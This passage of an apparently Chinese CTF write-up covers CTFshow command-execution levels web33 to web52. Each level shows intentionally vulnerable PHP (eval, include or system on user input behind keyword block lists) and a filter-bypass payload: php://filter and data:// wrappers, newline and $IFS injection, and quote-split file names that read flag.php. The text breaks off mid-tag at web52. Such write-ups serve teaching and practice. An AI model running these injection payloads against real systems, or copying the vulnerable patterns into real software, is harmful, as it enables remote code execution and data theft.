class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>过滤内容比上题还多，但是不影响上道题的payload，所以payload跟上题一样</p><h1 id="web34"><a href="#web34" class="headerlink" title="web34()"></a>web34()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><ul><li>payload和上题一样</li></ul><h1 id="web35"><a href="#web35" class="headerlink" title="web35()"></a>web35()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[1]?&gt;    POST: 1=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>又过滤了<code>&lt;</code>和<code>=</code>，不过影响不大，上道题的payload依旧能用</p><h1 id="web36"><a href="#web36" class="headerlink" title="web36()"></a>web36()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=include%0a$_POST[a]?&gt;    POST: a=php://filter/read=convert.base64-encode/resource=flag.php</code></p><p>又过滤了数字，只需要将上道题的POST参数改成字母即可</p><h1 id="web37-data"><a href="#web37-data" class="headerlink" title="web37(data://)"></a>web37(data://)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=data://text/plain,&lt;?php system(&#39;cat f*&#39;);?&gt;</code></p><p><code>data://</code> 与包含函数结合时，用户输入的<code>data://</code>流会被当作php文件执行。从而导致任意代码执行</p><p>通过<code>data://</code>协议，读取文件</p><h1 id="web38-lt"><a href="#web38-lt" class="headerlink" title="web38(&lt;?=)"></a>web38(&lt;?=)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=data://text/plain,&lt;?= system(&#39;cat f*&#39;);?&gt;</code></p><p>发现将·<code>php</code>过滤了，可利用<code>&lt;?=</code>代替<code>&lt;?php</code></p><h1 id="web39"><a href="#web39" class="headerlink" title="web39()"></a>web39()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=data://text/plain,&lt;?= system(&#39;cat f*&#39;);?&gt;</code></p><p><code>data://text/plain,</code> 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</p><h1 id="web40-相关函数"><a href="#web40-相关函数" class="headerlink" title="web40(相关函数)"></a>web40(相关函数)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细观察发现，禁用的是中文括号，英文括号还是可以用的</p><p>先打印一下所有变量看一下</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40.png" alt=""></p><p>发现有POST变量，尝试POST随便传<code>a=phpinfo();</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_01.png" alt=""></p><p>发现可以传进去， 这意味着我们就可以RCE了，先用<code>next()</code>函数找到指定数组，成功输出</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_02.png" alt=""></p><p>再利用<code>current()</code>函数将当前单元值取出来</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_03.png" alt=""></p><p>成功！将<code>print_r</code>换成<code>eval</code>尝试能否执行代码</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/40_04.png" alt=""></p><p>成功，最后只需要更改POST值来寻找flag即可</p><p>最终payload</p><p><code>?c=eval(current(next(get_defined_vars())));    POST: a=system(&#39;cat f*&#39;);</code></p><h1 id="web41-异或"><a href="#web41-异或" class="headerlink" title="web41(异或)"></a>web41(异或)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现字母啥的都被过滤了，但是<code>|</code>给留下来了，这就可以进行或运算来拼凑命令</p><p>也可以看提示，利用大佬的脚本，直接运行即可</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/41.png" alt=""></p><h1 id="web42"><a href="#web42" class="headerlink" title="web42()"></a>web42()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&gt;/dev/null</code>文件描述符，往里面输出的所有数据都不会保存</p><p>可以利用换行符<code>%0a</code>绕过</p><p><code>paylaod: ?c=cat f*%0a</code></p><h1 id="web43"><a href="#web43" class="headerlink" title="web43()"></a>web43()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac f*%0a</code></p><p> 跟上题差不多，禁用了<code>cat</code>，可以用它的替换函数这里用的<code>tac</code></p><h1 id="web44"><a href="#web44" class="headerlink" title="web44()"></a>web44()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac f*%0a</code></p><p>在上题的基础上过滤了<code>flag</code>，可以利用正则匹配绕过</p><h1 id="web45"><a href="#web45" class="headerlink" title="web45()"></a>web45()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac$IFS*%0a</code></p><p>依旧是过滤，这次多了个空格，利用<code>$IFS</code>绕过</p><h1 id="web46"><a href="#web46" class="headerlink" title="web46()"></a>web46()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac%09f?ag.php%0a</code></p><p>依旧还是过滤，<code>$</code>不能用了，换个空格的代替即可</p><h1 id="web47"><a href="#web47" class="headerlink" title="web47()"></a>web47()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac%09f?ag.php%0a</code></p><p>禁用了一大堆命令，上题的payload依旧能用</p><h1 id="web48"><a href="#web48" class="headerlink" title="web48()"></a>web48()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac%09f?ag.php%0a</code></p><p>禁用的更多了，但是不影响我们用上题的paylaod</p><h1 id="web49"><a href="#web49" class="headerlink" title="web49()"></a>web49()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac%09f?ag.php%0a</code></p><p>依旧不变</p><h1 id="web50-nl"><a href="#web50-nl" class="headerlink" title="web50(nl)"></a>web50(nl)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>09</code>被禁用了，空额也用不了，只能尝试用不带空格的命令<code>nl</code>了（cat的替代函数）</p><p><code>nl</code>不支持通配符，不能用<code>fl?g.php</code>，但是可以利用shell特性<code>&#39;&#39;</code>分割</p><p><code>payload: ?c=nl&lt;fl&#39;&#39;ag.php%0a</code></p><h1 id="web51"><a href="#web51" class="headerlink" title="web51()"></a>web51()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=nl&lt;fl&#39;&#39;ag.php%0a</code></p><p>跟上道题一样</p><h1 id="web52"><a href="#web52" class="headerlink" title="web52()"></a>web52()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了<code>&lt;</code>，但是没禁用<code>$</code>和，嘿嘿</p><p>可以考虑利用<code>cp</code>命令，复制flag.php文件</p><p>利用<code>?c=cp$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt%0a</code>将flag.php复制到a.txt中，在利用<code>ls</code>命令查看是否拷贝成功</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52.png" alt=""></p><p>成功拷贝，访问a.txt即可</p><p><img 